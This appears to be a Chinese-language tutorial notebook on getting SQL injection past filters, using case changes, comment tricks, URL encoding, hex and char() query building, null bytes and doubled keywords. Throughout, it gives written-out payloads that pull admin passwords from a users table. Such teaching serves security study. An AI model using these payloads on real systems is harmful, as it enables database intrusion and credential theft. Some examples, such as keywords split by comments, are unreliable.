## 大小写变化
sql语言是不区分大小写额度，所以可以通过变换攻击字符中的大小写来避开他们，从而实现绕过前端。由于前端可能对关键字段如amd select union这些sql字段进行了过滤，所以如果上传了这些单词可定是不能通过过滤的，但是php，java，python这些都是区分大小写的高级语言。而sql是不区分大小写的。因此，打乱了某个字段的大小写，也就是可以变相绕过后台的过滤，从而直接到达数据库。
举例：当order被过滤的时候，使用Order可以跳过过滤。
1. 选择合适的大小写。如order被过滤，则使用Order
<img src="../pictures/cbctpf50vmm.png" width="600" />
查询出来一共有三个字段。
<img src="../pictures/8fa0d224hsw.png" width="600" />
2. 选择合适的大小写Union，从而跳过union字段的过滤。从而获取到数据。


## 使用sql注释
1. 使用注释代替空格

```sql
/**/union/**/select/**/password/**/from/**/tblUsers/**/where/**/uusername/**/like/**/'admin'
```


2. 使用内部连接注释
举例子：以下一句sql

```sql
/**/union/**/select/**/password/**/from/**/tblUsers/**/where/**/uusername/**/like/**/'admin'
```


可以改写成

```sql
/**/un/**/ion/**/se/**/lect/**/password/**/fr/**/om/**/tblUsers/**/wh/**/ere/**/uusername/**/li/**/ke/**/'admin'
```


.因此可以看出，我们可以使用内联注释来对关键字符进行拆分，从而实现越过过滤器

## 使用url编码

用URL编码来逃避过滤。有以下一条sql语句

```sql
/**/union/**/select/**/password/**/from/**/tblUsers/**/where/**/uusername/**/like/**/'admin'
```


如果过滤器对“/*”进行了过滤，那么这条语句肯定是不能通过，随意可以将其转换为

```sql
%2f%2a*/union%2f%2a*/select%2f%2a*/password%2f%2a*/from%2f%2a*/tblUsers%2f%2a*/where%2f%2a*/uusername%2f%2a*/like%2f%2a*/'admin'
```


对关键字符进行url编码，从而实现过滤。如果一次不行们可以进行两次甚至多次url编码，但只要记住只是对关键字符进行url编码。其中为什么多次url编码可以实现，这个是由于web应用有时候多次解码

unicode编码方式  
由于unicode编码方式的复杂性，所以解码器是啊按照最近匹配原则进行匹配unicode匹配编码。

## 使用动态查询执行


简单来说，就是将sql语句存储到一个变量中，然后执行这条sql语句。其中的关键之处在于sql语句是字符串形式，这也就代表着有多种方法可以构造字符串。
1. 连接字符串
Oracel ： 'sel'||'et' $\rightarrow$ 'select'
Mysql : 'sel''ect' $\rightarrow$ 'select'

2. 使用ascii码
'select' $\rightarrow$ char(83)+char(69)+char(76)+char(69)+char(67)+char(84)

3. 使用sql字符串的ascii十六进制来代替字符串
```sql
select password from tblUsers
```
SQL SERVER 也可以按照以下形式进行构造
```
DECLARE @query varchar(100);
SELECT @query = 0x53454C454354202A2046524F4D2074626C7573657273
exec(@query)
```
其中 0x53454C454354202A2046524F4D2074626C7573657273就是SELECT * FROM tblusers的16进制。


```{.python .input  n=8}
for i in "SELECT password FROM tblUsers":
    print(int(str(ord(i))),end="")
```

```{.json .output n=8}
[
 {
  "name": "stdout",
  "output_type": "stream",
  "text": "83697669678432112971151151191111141003270827977321169810885115101114115"
 }
]
```

## 使用空字符
由于过滤器一般都是存在于自生代码之外，比如WAF与IDS。而这些组件与原来的后台的编写语言是不同的，由于不同语言之间存在差异，可以使用这些微小差异进行绕过过滤。其中比较重要的一点就是可以使用空字符进行注入。原生过滤在遇到%00就会停止读取，也就能够绕过过滤了。比如
```sql
%00' union select password from tblusers where username='admin'--
```
从而实现空字符隔断注入


## 双写绕过注入
当前台不采用匹配过滤，而采用匹配删除的情况来使用的时候。比如and就会被删除and，那么则使用anand.这样子只有被过滤了才算成功注入。即从anand中删除and。变成了另外一个and。
举例，过滤了关键词or。
<img src="../pictures/4y1vk21iflq.png" width="600" />

```{.python .input}

```
